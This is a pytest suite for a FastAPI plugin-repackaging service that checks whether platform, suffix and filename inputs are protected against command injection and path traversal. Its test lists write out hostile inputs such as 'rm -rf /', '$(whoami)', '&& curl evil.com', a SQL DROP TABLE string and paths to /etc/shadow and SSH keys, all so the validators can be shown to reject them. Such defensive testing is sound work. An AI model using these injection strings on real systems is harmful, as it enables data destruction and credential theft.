"""
Security validation tests for command injection prevention.

This test suite validates that all security fixes for command injection are working correctly:
1. Platform whitelist validation
2. Suffix regex validation
3. Filename sanitization (path traversal, special characters)
4. Shell script input validation
"""

import pytest
from unittest.mock import Mock, patch, AsyncMock
from fastapi import HTTPException
from httpx import AsyncClient
from pydantic import ValidationError

from app.models.task import TaskCreate, MarketplaceTaskCreate, Platform
from app.api.v1.endpoints.tasks import (
    sanitize_filename,
    validate_platform,
    validate_suffix,
    validate_task_path,
)


class TestPlatformValidation:
    """Test platform whitelist validation."""

    def test_valid_platforms(self):
        """Test that valid platforms pass validation."""
        valid_platforms = [
            "",  # Default/empty
            "manylinux2014_x86_64",
            "manylinux2014_aarch64",
            "manylinux_2_17_x86_64",
            "manylinux_2_17_aarch64",
            "macosx_10_9_x86_64",
            "macosx_11_0_arm64",
        ]

        for platform in valid_platforms:
            result = validate_platform(platform)
            assert result == platform

    def test_invalid_platforms(self):
        """Test that invalid platforms raise ValueError."""
        invalid_platforms = [
            "invalid-platform",
            "linux",
            "windows",
            "manylinux2014_x86_64; rm -rf /",
            "$(whoami)",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "../../../etc/passwd",
        ]

        for platform in invalid_platforms:
            with pytest.raises(ValueError, match="Invalid platform"):
                validate_platform(platform)

    def test_platform_enum_validation(self):
        """Test Platform enum validation in Pydantic models."""
        # Valid platform
        task = TaskCreate(
            url="https://example.com/plugin.difypkg",
            platform=Platform.MANYLINUX2014_X86_64,
            suffix="offline"
        )
        assert task.platform == Platform.MANYLINUX2014_X86_64

        # Valid default platform
        task = TaskCreate(
            url="https://example.com/plugin.difypkg",
            platform=Platform.DEFAULT,
            suffix="offline"
        )
        assert task.platform == Platform.DEFAULT

    def test_marketplace_task_platform_validation(self):
        """Test platform validation in MarketplaceTaskCreate model."""
        task = MarketplaceTaskCreate(
            author="langgenius",
            name="agent",
            version="0.0.9",
            platform=Platform.MANYLINUX2014_X86_64,
            suffix="offline"
        )
        assert task.platform == Platform.MANYLINUX2014_X86_64


class TestSuffixValidation:
    """Test suffix regex validation."""

    def test_valid_suffixes(self):
        """Test that valid suffixes pass validation."""
        valid_suffixes = [
            "offline",
            "linux-amd64",
            "linux-arm64",
            "custom_suffix",
            "v1-0-0",
            "test123",
            "ABC-xyz_123",
        ]

        for suffix in valid_suffixes:
            result = validate_suffix(suffix)
            assert result == suffix

    def test_invalid_suffixes_special_chars(self):
        """Test that suffixes with special characters are rejected."""
        invalid_suffixes = [
            "offline; rm -rf /",
            "$(whoami)",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "../../../etc/passwd",
            "suffix with spaces",
            "suffix@email.com",
            "suffix#hash",
            "suffix!bang",
            "suffix$dollar",
            "suffix%percent",
            "suffix^caret",
            "suffix*asterisk",
            "suffix(paren)",
            "suffix[bracket]",
            "suffix{brace}",
            "suffix|pipe",
            "suffix\\backslash",
            "suffix`backtick",
            "suffix'quote",
            'suffix"doublequote',
            "suffix<less",
            "suffix>greater",
            "suffix?question",
            "suffix/slash",
        ]

        for suffix in invalid_suffixes:
            with pytest.raises(ValueError, match="can only contain alphanumeric"):
                validate_suffix(suffix)

    def test_empty_suffix(self):
        """Test that empty suffix is rejected."""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_suffix("")

    def test_suffix_too_long(self):
        """Test that suffix longer than 50 characters is rejected."""
        long_suffix = "a" * 51
        with pytest.raises(ValueError, match="must be 50 characters or less"):
            validate_suffix(long_suffix)

    def test_suffix_max_length(self):
        """Test that suffix exactly 50 characters is accepted."""
        max_suffix = "a" * 50
        result = validate_suffix(max_suffix)
        assert result == max_suffix

    def test_pydantic_suffix_validation(self):
        """Test suffix validation in Pydantic models."""
        # Valid suffix
        task = TaskCreate(
            url="https://example.com/plugin.difypkg",
            platform=Platform.DEFAULT,
            suffix="offline"
        )
        assert task.suffix == "offline"

        # Invalid suffix with special characters
        with pytest.raises(ValidationError):
            TaskCreate(
                url="https://example.com/plugin.difypkg",
                platform=Platform.DEFAULT,
                suffix="offline; rm -rf /"
            )


class TestFilenameValidation:
    """Test filename sanitization and path traversal prevention."""

    def test_valid_filenames(self):
        """Test that valid filenames are sanitized correctly."""
        valid_files = [
            ("plugin.difypkg", "plugin.difypkg"),
            ("my-plugin.difypkg", "my-plugin.difypkg"),
            ("my_plugin.difypkg", "my_plugin.difypkg"),
            ("plugin123.difypkg", "plugin123.difypkg"),
            ("ABC-xyz_123.difypkg", "ABC-xyz_123.difypkg"),
        ]

        for input_name, expected in valid_files:
            result = sanitize_filename(input_name)
            assert result == expected

    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are blocked."""
        path_traversal_attempts = [
            ("../../../etc/passwd.difypkg", "passwd.difypkg"),
            ("../../etc/shadow.difypkg", "shadow.difypkg"),
            ("../plugin.difypkg", "plugin.difypkg"),
            ("/etc/passwd.difypkg", "passwd.difypkg"),
            ("/root/.ssh/id_rsa.difypkg", "id_rsa.difypkg"),
            ("../../../../var/www/plugin.difypkg", "plugin.difypkg"),
        ]

        for input_filename, expected_basename in path_traversal_attempts:
            # Should sanitize to basename
            result = sanitize_filename(input_filename)
            # After sanitization, should not contain path separators
            assert "/" not in result
            assert "\\" not in result
            # Should end with .difypkg
            assert result.endswith(".difypkg")
            # Should be the basename
            assert result == expected_basename

    def test_special_characters_sanitization(self):
        """Test that special characters are removed/replaced."""
        special_char_files = [
            ("plugin;rm -rf /.difypkg", "plugin_rm_-rf__.difypkg"),
            ("$(whoami).difypkg", "__whoami_.difypkg"),
            ("|cat /etc/passwd.difypkg", "_cat__etc_passwd.difypkg"),
            ("&&curl evil.com.difypkg", "__curl_evil.com.difypkg"),
            ("plugin`whoami`.difypkg", "plugin_whoami_.difypkg"),
            ("plugin$USER.difypkg", "plugin_USER.difypkg"),
        ]

        for input_name, expected in special_char_files:
            result = sanitize_filename(input_name)
            # Should not contain shell metacharacters
            assert ";" not in result
            assert "|" not in result
            assert "&" not in result
            assert "$" not in result
            assert "`" not in result
            assert "(" not in result
            assert ")" not in result

    def test_empty_filename_rejected(self):
        """Test that empty filename is rejected."""
        with pytest.raises(ValueError, match="cannot be empty"):
            sanitize_filename("")

    def test_dot_files_rejected(self):
        """Test that . and .. are rejected."""
        with pytest.raises(ValueError, match="Invalid filename"):
            sanitize_filename(".")

        with pytest.raises(ValueError, match="Invalid filename"):
            sanitize_filename("..")

    def test_missing_extension_handling(self):
        """Test handling of files without .difypkg extension."""
        # File without extension should be rejected
        with pytest.raises(ValueError, match="must end with .difypkg"):
            sanitize_filename("plugin")

        # File with wrong extension should be rejected
        with pytest.raises(ValueError, match="must end with .difypkg"):
            sanitize_filename("plugin.zip")


class TestPathTraversalValidation:
    """Test path traversal validation for task directories."""

    def test_valid_task_path(self, temp_directory):
        """Test that valid paths within task directory pass validation."""
        task_dir = temp_directory
        file_path = f"{task_dir}/plugin.difypkg"

        result = validate_task_path(task_dir, file_path)
        assert result.startswith(task_dir)

    def test_path_traversal_blocked(self, temp_directory):
        """Test that path traversal attempts are blocked."""
        task_dir = temp_directory

        # Try to escape task directory
        malicious_paths = [
            "../../../etc/passwd",
            f"{task_dir}/../../../etc/passwd",
            f"{task_dir}/../other_task/file.difypkg",
        ]

        for malicious_path in malicious_paths:
            # Some paths might resolve to locations outside task_dir
            # These should be caught by the validation
            try:
                result = validate_task_path(task_dir, malicious_path)
                # If it doesn't raise, check it's still within task_dir
                assert result.startswith(task_dir)
            except ValueError as e:
                assert "Path traversal detected" in str(e)


class TestCommandInjectionPayloads:
    """Test that common command injection payloads are rejected."""

    @pytest.mark.asyncio
    async def test_platform_injection_payloads(self, async_client: AsyncClient):
        """Test that command injection payloads in platform parameter are rejected."""
        injection_payloads = [
            "; rm -rf /",
            "$(whoami)",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "`id`",
            "$USER",
            "'; DROP TABLE users; --",
            "\n/bin/sh",
        ]

        for payload in injection_payloads:
            task_data = {
                "url": "https://example.com/plugin.difypkg",
                "platform": payload,
                "suffix": "offline"
            }

            # Should get validation error (422) for invalid platform
            response = await async_client.post("/api/v1/tasks", json=task_data)
            assert response.status_code in [400, 422], f"Platform payload '{payload}' should be rejected"

    @pytest.mark.asyncio
    async def test_suffix_injection_payloads(self, async_client: AsyncClient):
        """Test that command injection payloads in suffix parameter are rejected."""
        injection_payloads = [
            "; rm -rf /",
            "$(whoami)",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "`id`",
            "$USER",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
        ]

        for payload in injection_payloads:
            task_data = {
                "url": "https://example.com/plugin.difypkg",
                "platform": "",
                "suffix": payload
            }

            # Should get validation error
            response = await async_client.post("/api/v1/tasks", json=task_data)
            assert response.status_code in [400, 422], f"Suffix payload '{payload}' should be rejected"

    @pytest.mark.asyncio
    async def test_upload_filename_injection_payloads(self, async_client: AsyncClient):
        """Test that command injection payloads in filename are rejected."""
        injection_payloads = [
            "; rm -rf /.difypkg",
            "$(whoami).difypkg",
            "|cat /etc/passwd.difypkg",
            "&&curl evil.com.difypkg",
            "`id`.difypkg",
            "../../../etc/passwd.difypkg",
        ]

        for payload in injection_payloads:
            # Create mock file upload
            files = {
                "file": (payload, b"fake plugin content", "application/zip")
            }
            data = {
                "platform": "",
                "suffix": "offline"
            }

            # The filename should be sanitized or rejected
            with patch('app.api.v1.endpoints.tasks.redis_client') as mock_redis:
                with patch('app.api.v1.endpoints.tasks.process_repackaging') as mock_task:
                    mock_redis.setex.return_value = True
                    mock_task.delay.return_value = Mock(id="test-123")

                    response = await async_client.post(
                        "/api/v1/tasks/upload",
                        files=files,
                        data=data
                    )

                    # Should either succeed with sanitized filename or fail with validation error
                    if response.status_code == 200:
                        # If successful, verify filename was sanitized
                        # The sanitized filename should not contain dangerous characters
                        task_data = response.json()
                        # Just verify it didn't reject valid request structure
                        assert "task_id" in task_data
                    else:
                        # Or it should be rejected with appropriate error
                        assert response.status_code in [400, 422]


class TestMarketplaceTaskSecurity:
    """Test security validation for marketplace tasks."""

    @pytest.mark.asyncio
    async def test_marketplace_platform_validation(self, async_client: AsyncClient):
        """Test platform validation in marketplace task endpoint."""
        # Valid request
        task_data = {
            "author": "langgenius",
            "name": "agent",
            "version": "0.0.9",
            "platform": "manylinux2014_x86_64",
            "suffix": "offline"
        }

        with patch('app.api.v1.endpoints.tasks.redis_client') as mock_redis:
            with patch('app.api.v1.endpoints.tasks.process_marketplace_repackaging') as mock_task:
                mock_redis.setex.return_value = True
                mock_task.delay.return_value = Mock(id="test-123")
                response = await async_client.post("/api/v1/tasks/marketplace", json=task_data)
                assert response.status_code == 200

    @pytest.mark.asyncio
    async def test_marketplace_invalid_platform(self, async_client: AsyncClient):
        """Test that invalid platform is rejected in marketplace endpoint."""
        task_data = {
            "author": "langgenius",
            "name": "agent",
            "version": "0.0.9",
            "platform": "; rm -rf /",
            "suffix": "offline"
        }

        response = await async_client.post("/api/v1/tasks/marketplace", json=task_data)
        assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_marketplace_invalid_suffix(self, async_client: AsyncClient):
        """Test that invalid suffix is rejected in marketplace endpoint."""
        task_data = {
            "author": "langgenius",
            "name": "agent",
            "version": "0.0.9",
            "platform": "",
            "suffix": "$(whoami)"
        }

        response = await async_client.post("/api/v1/tasks/marketplace", json=task_data)
        assert response.status_code in [400, 422]


class TestSecurityRegression:
    """Regression tests for security fixes."""

    def test_platform_validation_catches_shell_metacharacters(self):
        """Test that platform validation catches all shell metacharacters."""
        shell_metacharacters = [";", "|", "&", "$", "`", "(", ")", "<", ">", "\n", "\r"]

        for char in shell_metacharacters:
            malicious_platform = f"valid_platform{char}malicious"
            with pytest.raises(ValueError):
                validate_platform(malicious_platform)

    def test_suffix_validation_regex_is_restrictive(self):
        """Test that suffix validation only allows safe characters."""
        # Only alphanumeric, hyphens, and underscores should be allowed
        safe_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"

        for char in safe_chars:
            suffix = f"test{char}suffix"
            result = validate_suffix(suffix)
            assert result == suffix

    def test_filename_sanitization_removes_all_metacharacters(self):
        """Test that filename sanitization removes/replaces all dangerous characters."""
        dangerous_chars = [";", "|", "&", "$", "`", "(", ")", "<", ">", " ", "\n", "\t"]

        for char in dangerous_chars:
            filename = f"plugin{char}test.difypkg"
            result = sanitize_filename(filename)
            # Dangerous character should be replaced with underscore
            assert char not in result
            assert result.endswith(".difypkg")

    def test_no_command_substitution_possible(self):
        """Test that command substitution syntax is blocked."""
        command_substitution_patterns = [
            "$(command)",
            "`command`",
            "${variable}",
            "$variable",
        ]

        for pattern in command_substitution_patterns:
            # Should be rejected in platform
            with pytest.raises(ValueError):
                validate_platform(pattern)

            # Should be rejected in suffix
            with pytest.raises(ValueError):
                validate_suffix(pattern)

            # Should be sanitized in filename
            result = sanitize_filename(f"{pattern}.difypkg")
            assert "$" not in result
            assert "`" not in result
            assert "(" not in result


# Additional integration-style tests
class TestSecurityIntegration:
    """Integration tests for security validation across the system."""

    @pytest.mark.asyncio
    async def test_end_to_end_task_creation_with_valid_inputs(
        self, async_client: AsyncClient
    ):
        """Test that valid inputs work correctly end-to-end."""
        task_data = {
            "url": "https://marketplace.dify.ai/download/plugin.difypkg",
            "platform": "manylinux2014_x86_64",
            "suffix": "linux-amd64"
        }

        with patch('app.api.v1.endpoints.tasks.redis_client') as mock_redis:
            with patch('app.api.v1.endpoints.tasks.process_repackaging') as mock_process:
                mock_redis.setex.return_value = True
                mock_process.delay.return_value = Mock(id="task-123")

                response = await async_client.post("/api/v1/tasks", json=task_data)
                assert response.status_code == 200

                data = response.json()
                assert "task_id" in data
                assert data["status"] == "pending"

    @pytest.mark.asyncio
    async def test_end_to_end_marketplace_task_with_valid_inputs(
        self, async_client: AsyncClient
    ):
        """Test that valid marketplace task creation works end-to-end."""
        task_data = {
            "author": "langgenius",
            "name": "agent",
            "version": "0.0.9",
            "platform": "manylinux2014_x86_64",
            "suffix": "offline"
        }

        with patch('app.api.v1.endpoints.tasks.redis_client') as mock_redis:
            with patch('app.api.v1.endpoints.tasks.process_marketplace_repackaging') as mock_process:
                mock_redis.setex.return_value = True
                mock_process.delay.return_value = Mock(id="task-123")

                response = await async_client.post("/api/v1/tasks/marketplace", json=task_data)
                assert response.status_code == 200

                data = response.json()
                assert "task_id" in data
                assert data["status"] == "pending"
